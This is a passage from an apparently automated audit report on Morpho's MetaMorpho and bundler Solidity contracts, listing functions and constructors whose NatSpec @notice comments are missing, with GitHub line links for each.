/// @audit missed @notice
94:     function pendingCap(Id) external view returns (PendingUint192 memory);

/// @audit missed @notice
95:     function pendingTimelock() external view returns (PendingUint192 memory);

```

[19](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [23](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L23), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L24), [25](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L25), [26](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L26), [27](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L27), [33](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L33), [35](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L35), [36](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L36), [37](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L37), [39](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L39), [40](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L40), [41](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L41), [42](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L42), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L43), [44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L44), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L45), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L46), [48](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L48), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L50), [51](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L51), [52](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L52), [54](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L54), [55](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L55), [56](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L56), [58](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L58), [59](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L59), [61](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L61), [62](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L62), [63](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L63), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L65), [67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L67), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L68), [69](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L69), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L70), [71](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L71), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L73), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L74), [75](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L75), [81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L82), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [84](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L84), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [93](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L93), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94), [95](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L95)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @notice
7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams);

```

[7](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L7)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit missed @notice
65:     function _multicall(bytes[] memory data) internal {

/// @audit missed @notice
76:     function _revert(bytes memory returnData) internal pure {

/// @audit missed @notice
87:     function _isSenderAuthorized() internal view virtual returns (bool) {

/// @audit missed @notice
93:     function _approveMaxTo(address asset, address spender) internal {

```

[65](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L65), [76](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L76), [87](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L87), [93](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L93)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit missed @notice
26:     constructor(address morpho) {

/// @audit missed @notice
34:     function onMorphoSupply(uint256, bytes calldata data) external {

/// @audit missed @notice
39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external {

/// @audit missed @notice
44:     function onMorphoRepay(uint256, bytes calldata data) external {

/// @audit missed @notice
49:     function onMorphoLiquidate(uint256, bytes calldata data) external {

/// @audit missed @notice
54:     function onMorphoFlashLoan(uint256, bytes calldata data) external {

/// @audit missed @notice
272:     function _callback(bytes calldata data) internal {

/// @audit missed @notice
279:     function _isSenderAuthorized() internal view virtual override returns (bool) {

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L26), [34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54), [272](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L272), [279](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L279)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

/// @audit missed @notice
32:     constructor(address wstEth) {

```

[32](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L32)

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

/// @audit missed @notice
29:     constructor(address wNative) {

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L29)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

/// @audit missed @notice
34:     constructor(address morpho) WNativeBundler(MainnetLib.WETH) MorphoBundler(morpho) {}

/// @audit missed @notice
39:     function _isSenderAuthorized() internal view override(BaseBundler, MorphoBundler) returns (bool) {

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L39)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumStEthBundler.sol

/// @audit missed @notice
15:     constructor() StEthBundler(MainnetLib.WST_ETH) {}

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @notice
6:     function nonces(address holder) external view returns (uint256);

/// @audit missed @notice
16:     function permit(

```

[6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L6), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L16)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @notice
5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256);

/// @audit missed @notice
7:     function getPooledEthByShares(uint256 _sharesAmount) external view returns (uint256);

/// @audit missed @notice
9:     function getSharesByPooledEth(uint256 _stEthAmount) external view returns (uint256);

/// @audit missed @notice
11:     function getCurrentStakeLimit() external view returns (uint256);

/// @audit missed @notice
13:     function submit(address _referral) external payable returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L13)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @notice
5:     function deposit() external payable;

/// @audit missed @notice
6:     function withdraw(uint256 wad) external;

/// @audit missed @notice
7:     function approve(address guy, uint256 wad) external returns (bool);

/// @audit missed @notice
8:     function transferFrom(address src, address dst, uint256 wad) external returns (bool);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L5), [6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L6), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L8)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @notice
5:     function DOMAIN_SEPARATOR() external view returns (bytes32);

/// @audit missed @notice
7:     function allowance(address owner, address spender) external view returns (uint256);

/// @audit missed @notice
8:     function approve(address spender, uint256 amount) external returns (bool);

/// @audit missed @notice
9:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @notice
10:     function decimals() external view returns (uint8);

/// @audit missed @notice
11:     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

/// @audit missed @notice
12:     function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256);

/// @audit missed @notice
13:     function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);

/// @audit missed @notice
14:     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

/// @audit missed @notice
15:     function name() external view returns (string memory);

/// @audit missed @notice
16:     function nonces(address owner) external view returns (uint256);

/// @audit missed @notice
17:     function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)

/// @audit missed @notice
19:     function stETH() external view returns (address);

/// @audit missed @notice
20:     function stEthPerToken() external view returns (uint256);

/// @audit missed @notice
21:     function symbol() external view returns (string memory);

/// @audit missed @notice
22:     function tokensPerStEth() external view returns (uint256);

/// @audit missed @notice
23:     function totalSupply() external view returns (uint256);

/// @audit missed @notice
24:     function transfer(address recipient, uint256 amount) external returns (bool);

/// @audit missed @notice
25:     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

/// @audit missed @notice
26:     function unwrap(uint256 wstETHAmount) external returns (uint256);

/// @audit missed @notice
27:     function wrap(uint256 stETHAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L9), [10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L10), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L14), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L15), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L16), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L19), [20](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L20), [21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L21), [22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L22), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L23), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L24), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L25), [26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L26), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

/// @audit missed @notice
29:     constructor(address morpho, address aaveV2Pool, address wstEth) MigrationBundler(morpho) StEthBundler(wstEth) {

/// @audit missed @notice
64:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MigrationBundler) returns (bool) {

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L29), [64](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L64)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

/// @audit missed @notice
26:     constructor(address morpho, address aaveV3Pool) MigrationBundler(morpho) {

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L26)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

/// @audit missed @notice
29:     constructor(address morpho, address wNative, address cEth) WNativeBundler(wNative) MigrationBundler(morpho) {

/// @audit missed @notice
78:     function _isSenderAuthorized() internal view override(BaseBundler, MigrationBundler) returns (bool) {

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L29), [78](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L78)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

/// @audit missed @notice
19:     constructor(address morpho) MigrationBundler(morpho) {}

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

/// @audit missed @notice
22:     constructor(address morpho) MorphoBundler(morpho) {}

/// @audit missed @notice
27:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MorphoBundler) returns (bool) {

```

[22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L22), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @notice
56:     function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

/// @audit missed @notice
70:     function withdraw(address asset, uint256 amount, address to) external returns (uint256);

/// @audit missed @notice
88:     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)

/// @audit missed @notice
112:     function swapBorrowRateMode(address asset, uint256 rateMode) external;

/// @audit missed @notice
125:     function rebalanceStableBorrowRate(address asset, address user) external;

/// @audit missed @notice
133:     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

/// @audit missed @notice
148:     function liquidationCall(

/// @audit missed @notice
176:     function flashLoan(

/// @audit missed @notice
197:     function getUserAccountData(address user)

/// @audit missed @notice
209:     function initReserve(

/// @audit missed @notice
217:     function setReserveInterestRateStrategyAddress(address reserve, address rateStrategyAddress) external;

/// @audit missed @notice
219:     function setConfiguration(address reserve, uint256 configuration) external;

/// @audit missed @notice
226:     function getReserveNormalizedIncome(address asset) external view returns (uint256);

/// @audit missed @notice
233:     function getReserveNormalizedVariableDebt(address asset) external view returns (uint256);

/// @audit missed @notice
241:     function getReserveData(address asset) external view returns (ReserveData memory);

/// @audit missed @notice
243:     function finalizeTransfer(

/// @audit missed @notice
252:     function getReservesList() external view returns (address[] memory);

/// @audit missed @notice
254:     function getAddressesProvider() external view returns (address);

/// @audit missed @notice
256:     function setPause(bool val) external;

/// @audit missed @notice
258:     function paused() external view returns (bool);

/// @audit missed @notice
260:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);

```

[56](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L56), [70](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L70), [88](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L88), [112](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L112), [125](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L125), [133](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L133), [148](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L148), [176](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L176), [197](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L197), [209](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L209), [217](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L217), [219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L219), [226](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L226), [233](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L233), [241](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L241), [243](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L243), [252](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L252), [254](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L254), [256](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L256), [258](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L258), [260](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L260)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @notice
5:     function repayBorrowBehalf(address borrower) external payable;

/// @audit missed @notice
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @notice
9:     function exchangeRateStored() external view returns (uint256);

/// @audit missed @notice
11:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @notice
13:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @notice
15:     function borrow(uint256 borrowAmount) external returns (uint256);

/// @audit missed @notice
17:     function mint() external payable;

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L17)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @notice
5:     function underlying() external returns (address);

/// @audit missed @notice
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @notice
9:     function exchangeRateStored() external view returns (uint256);

/// @audit missed @notice
11:     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);

/// @audit missed @notice
13:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @notice
15:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @notice
17:     function borrow(uint256 borrowAmount) external returns (uint256);

/// @audit missed @notice
19:     function mint(uint256 mintAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @notice
21:     function name() external view returns (string memory);

/// @audit missed @notice
